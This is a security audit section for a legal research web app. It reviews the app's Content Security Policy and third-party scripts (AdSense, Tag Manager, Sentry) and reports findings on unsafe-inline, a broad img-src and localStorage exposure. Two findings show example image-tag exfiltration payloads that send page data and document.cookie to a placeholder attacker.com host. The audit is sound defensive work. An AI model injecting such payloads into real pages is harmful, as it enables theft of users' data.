# Category 11: AdSense / Third-Party / CSP

Audit date: 2026-04-16
Auditor: inline (main session)

## CSP breakdown

Full CSP from `vercel.json:40`:

```
default-src 'self';
script-src 'self' 'unsafe-inline' https://pagead2.googlesyndication.com https://www.googletagmanager.com https://*.ingest.de.sentry.io;
style-src 'self' 'unsafe-inline';
font-src 'self';
img-src 'self' data: https:;
connect-src 'self' https://api.anthropic.com https://api.canlii.org https://*.ingest.de.sentry.io;
frame-src https://googleads.g.doubleclick.net;
object-src 'none';
base-uri 'self';
form-action 'self';
```

| Directive         | Value                                 | Concern                                                                                                                                                                                                                                       |
| ----------------- | ------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `script-src`      | `'unsafe-inline'` present             | **High** — defeats CSP as XSS mitigation entirely                                                                                                                                                                                             |
| `script-src`      | `https://www.googletagmanager.com`    | GTM is a script injection platform; allowing GTM ≈ allowing any script. GTM is not currently wired (no `gtag` calls found in source) but the allowlist entry exists.                                                                          |
| `script-src`      | `https://*.ingest.de.sentry.io`       | Wildcard subdomain; reasonable for Sentry ingest                                                                                                                                                                                              |
| `style-src`       | `'unsafe-inline'`                     | Expected for styled JSX/inline styles (CaseDive uses inline styles via ThemeContext)                                                                                                                                                          |
| `img-src`         | `https:`                              | Overly permissive — allows any HTTPS image host. Enables exfiltration via `<img src="https://attacker.com/?data=...">` if XSS is achieved                                                                                                     |
| `connect-src`     | `https://api.anthropic.com`           | **Should not be here** — model calls are server-side only (CLAUDE.md rule). Client-side code should not be able to reach Anthropic directly. This entry permits a browser-side script to POST to `api.anthropic.com` with any key it obtains. |
| `frame-src`       | `https://googleads.g.doubleclick.net` | Expected for AdSense                                                                                                                                                                                                                          |
| `frame-ancestors` | Not set                               | `X-Frame-Options: DENY` provides clickjacking protection for now (see Category 13)                                                                                                                                                            |
| `report-uri`      | Not set                               | No CSP violation reporting                                                                                                                                                                                                                    |

## Third-party scripts loaded

| Script                                                   | Where            | Access to DOM/localStorage                                                                                              |
| -------------------------------------------------------- | ---------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `pagead2.googlesyndication.com/pagead/js/adsbygoogle.js` | index.html:61-65 | **Yes** — loaded in the main page context, can access `window`, `document`, `localStorage`                              |
| `@vercel/analytics/react`                                | src/main.jsx:3   | Bundled — Vercel Analytics SDK; tracks page views. Does not have independent network access beyond `connect-src 'self'` |
| `@sentry/react`                                          | src/main.jsx:4   | Bundled — Sentry SDK; configured with `tracesSampleRate: 0.2`. DSN from `VITE_SENTRY_DSN` env var.                      |

## Findings

### [High] `script-src 'unsafe-inline'` defeats CSP as an XSS mitigation

File: vercel.json:40
Evidence: `'unsafe-inline'` in `script-src` allows any inline `<script>` or `onclick="..."` attribute to execute. If any HTML injection is ever achieved (via rendered model output, CanLII content, or a future bug), it immediately escalates to script execution. All other CSP controls become irrelevant.
Impact: XSS blast radius is unrestricted. Any injection → script exec.
Trace confidence: High. (Note: `unsafe-inline` is present because AdSense and GTM traditionally require it; both support nonce-based loading as an alternative.)

### [High] `connect-src` allows browser-to-Anthropic connections — violates server-side-only API rule

File: vercel.json:40
Evidence: `connect-src 'self' https://api.anthropic.com ...`
CLAUDE.md states: "Model/API calls server-side only." The CSP `connect-src` entry for `api.anthropic.com` permits any JavaScript running on `casedive.ca` (including AdSense) to make `fetch()` calls to Anthropic's API directly. Currently no client-side code does this, but the browser policy allows it. If an adversary gains JS execution (via XSS enabled by `unsafe-inline`), they can directly call Anthropic with any API key accessible in client context. Since the Anthropic key is server-side only (`process.env.ANTHROPIC_API_KEY`), it cannot be stolen this way — but the entry is still a policy violation and an unnecessary surface.
Impact: Violates stated architecture principle; could enable exfiltration of Anthropic-formatted requests to attacker-controlled servers masquerading as Anthropic (if combined with DNS spoofing — highly theoretical). Main issue is the policy violation itself.
Trace confidence: High

### [High] AdSense script has unrestricted access to localStorage including scenario history

File: index.html:61-65, src/App.jsx:165-185
Evidence: AdSense script (`pagead2.googlesyndication.com`) is loaded synchronously in `<head>` before React mounts. It runs in the main page context with full access to `window.localStorage`. `caseFinderHistory` localStorage key stores user scenario text for 7 days (see Category 7).
Attack: AdSense ad code (controlled by Google and ad network partners) could, in theory, read `localStorage["caseFinderHistory"]` and transmit the user's legal scenario text to a third-party analytics endpoint. While this requires a malicious ad, the capability is there and unmitigated.
Impact: Sensitive legal scenario text accessible to third-party ad scripts. For a legal research tool handling potentially sensitive queries, this is a significant privacy concern.
Trace confidence: High (localStorage access is unrestricted for same-origin scripts; AdSense loads same-origin per CSP)

### [Medium] `www.googletagmanager.com` in `script-src` allows arbitrary script injection via GTM

File: vercel.json:40
Evidence: GTM allows loading arbitrary scripts via tag configuration in the GTM console. No `gtag` calls found in the source — GTM does not appear to be actively used. However the CSP entry remains, meaning anyone with access to a GTM container configured for this site could inject arbitrary scripts.
Impact: If GTM container is ever configured for this domain, it becomes an unrestricted script injection point. Remove the entry if GTM is not in use.
Trace confidence: High (no active GTM usage confirmed by code search)

### [Medium] `img-src https:` allows exfiltration via pixel tracking

File: vercel.json:40
Evidence: `img-src 'self' data: https:` allows loading images from any HTTPS domain. Combined with `unsafe-inline` script execution, an attacker can exfiltrate data via `<img src="https://attacker.com/steal?data=encodeURIComponent(document.cookie)">`. Without cookies or session tokens, data exfiltration impact is limited (no session to steal), but localStorage content could be exfiltrated.
Impact: Exfiltration channel if XSS is achieved.
Trace confidence: High

## False Alarms

- **AdSense accessing Anthropic API key**: The Anthropic key is `process.env.ANTHROPIC_API_KEY` — server-side only, never in client bundle. AdSense cannot access it.
- **`unsafe-eval` present**: Confirmed absent. Only `unsafe-inline`.
- **GTM actively sending data**: No `dataLayer` or `gtag()` calls found in source. GTM script may load but fire no tags.

## Coverage Gaps

- AdSense script behavior cannot be statically audited — it is loaded remotely and changes regularly.
- Whether AdSense actually reads localStorage depends on the specific ad payload; no runtime test performed.
- Sentry `tracesSampleRate: 0.2` means 20% of navigations emit traces to Sentry; whether those traces include user scenario text depends on what Sentry's `browserTracingIntegration` captures (HTTP request bodies are not captured by default in Sentry browser SDK).
